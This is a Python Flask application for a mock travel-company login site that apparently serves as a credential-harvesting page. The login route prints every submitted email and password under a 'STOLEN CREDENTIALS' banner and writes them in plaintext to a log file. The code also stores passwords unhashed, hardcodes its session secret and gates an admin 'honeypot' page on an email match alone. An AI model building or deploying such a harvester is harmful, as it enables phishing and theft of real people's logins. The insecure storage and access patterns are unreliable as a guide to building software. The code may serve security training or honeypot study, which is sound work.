from flask import Flask, render_template, request, redirect, url_for, session, abort
import sqlite3
import logging
logging.basicConfig(filename='server.log', level=logging.INFO, format='%(asctime)s - %(message)s')
app = Flask(__name__)
app.secret_key = 'super_secret_key_for_session'

# --- DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect('travel.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users 
                 (id INTEGER PRIMARY KEY, email TEXT, password TEXT)''')
    conn.commit()
    conn.close()

# --- ROUTES ---

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        print(f"\n[+] 🔥 STOLEN CREDENTIALS: {email} | {password} 🔥\n")
        logging.info(f"LOGIN ATTEMPT: Email: {email} | Password: {password}")
        conn = sqlite3.connect('travel.db')
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE email = ? AND password = ?", (email, password))
        user = c.fetchone()
        conn.close()
        
        if user:
            session['user'] = email
            return redirect(url_for('dashboard'))
        else:
            return "Invalid Credentials! <a href='/'>Try Again</a>"
            
    # CHANGED: Now using the HTML file
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        
        conn = sqlite3.connect('travel.db')
        c = conn.cursor()
        c.execute("INSERT INTO users (email, password) VALUES (?, ?)", (email, password))
        conn.commit()
        conn.close()
        
        return "Account Created! <a href='/'>Login Now</a>"
        
    # We can reuse the login style for register or keep it simple. 
   
    return render_template('register.html')
    
@app.route('/dashboard')
def dashboard():
    if 'user' in session:
        return render_template('dashboard.html', user=session['user'])
    return redirect(url_for('login'))

# --- NEW ADMIN ROUTE (THE HONEYPOT) ---
@app.route('/admin')
def admin():
    # 1. Security Check: Are they the CEO?
    # We check if the user is logged in AND if their email matches the CEO's
    if 'user' in session and session['user'] == 'ceo@skyhigh.com':
        
        # 2. If CEO, fetch the sensitive database info (Honeypot Data)
        conn = sqlite3.connect('travel.db')
        c = conn.cursor()
        c.execute("SELECT * FROM users")
        all_users = c.fetchall() # Returns a list of all users
        conn.close()
        
        # 3. Show the secret admin panel
        # You must create 'admin.html' in your templates folder for this to work!
        return render_template('admin.html', users=all_users)
    
    # 4. If not CEO, kick them out
    return "<h1>403 Forbidden</h1><p>Nice try! Only the CEO can see this page.</p>"

@app.route('/logout')
def logout():
    session.pop('user', None)
    return redirect(url_for('login'))

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000)
